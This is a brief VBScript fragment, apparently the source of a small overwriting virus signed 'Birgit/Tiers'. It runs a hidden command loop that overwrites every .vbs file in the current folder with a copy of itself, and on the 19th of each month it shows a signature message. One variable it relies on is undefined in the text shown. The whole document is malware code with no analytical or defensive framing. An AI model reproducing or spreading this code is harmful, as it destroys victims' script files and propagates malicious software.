Set WshShell = Wscript.CreateObject("Wscript.Shell")

WshShell.Run (CommandPath & " /c for %%a in (*.vbs) do move /y " & Wscript.ScriptFullName & " %%a >nul"), vbHide

If Day(Now()) = 19 Then

WScript.Echo "Birgit" & Chr(19) & "by Birgit/Tiers"

End If
